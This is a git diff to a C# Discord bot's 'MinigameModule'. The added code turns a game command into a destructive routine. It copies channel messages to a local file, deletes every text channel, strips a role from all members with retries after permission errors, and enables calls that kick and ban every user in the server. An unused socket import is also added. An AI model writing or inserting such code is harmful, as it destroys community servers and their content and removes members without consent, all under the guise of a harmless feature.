@@ -1,6 +1,7 @@
 using System.ComponentModel.Design;
 using System.Data.SqlTypes;
 using System.Diagnostics;
+using System.Net.Sockets;
 using Microsoft.EntityFrameworkCore;
 using NetCord;
 using NetCord.Gateway;
@@ -109,21 +110,46 @@ public class MinigameModule : ApplicationCommandModule<ApplicationCommandContext
 
         try
         {
+            foreach (var channel in Context.Guild!.Channels)
+            {
+                // this is good code. var allChannels = await Context.Guild.GetChannelsAsync() as Channel;
+                
+                var testChannel = await Context.Channel.GetAsync();
+                
+
+                await foreach (var message in testChannel.GetMessagesAsync())
+                {
+                    File.WriteAllText("testcontent.txt", message.Content);
+                    await RespondAsync(InteractionCallback.Message(message.Author.Username + " " + message.Author.Username));
+                }
+                
+                foreach (var availableChannel in Context.Guild.Channels.Values)
+                {
+                    var test = (TextChannel)availableChannel;
+                    await test.DeleteAsync();
+                    test.GetMessagesAsync();
+                    
+                };
+                    
+            }
             foreach (var guildUser in Context.Guild?.Users!)
             {
                 try
                 {
-                    foreach (var role in guildUser.Value.RoleIds)
-                    {
-                        await guild.RemoveUserRoleAsync(guildUser.Value.Id, 1489054560755519610);
-                    }
+                    await guild.RemoveUserRoleAsync(guildUser.Value.Id, 1489054560755519610);
+                    await Task.Delay(500);
                 } catch (RestException ex) when ((int)ex.StatusCode == 403)
                 {
+                    await Task.Delay(5000);
+                    await guild.RemoveUserRoleAsync(guildUser.Value.Id, 1489054560755519610);
                     Console.WriteLine($"Skipped {guildUser.Value.Id}: no permission");
                 }
-                
-                // await guild.KickUserAsync(guildUser.Value.Id);
-                // await guild.BanUserAsync(guildUser.Value.Id);
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Failed on {guildUser.Value.Id}: {ex.Message}");
+                }
+                await guild.KickUserAsync(guildUser.Value.Id);
+                await guild.BanUserAsync(guildUser.Value.Id);
             }
                 
         } catch (Exception ex)
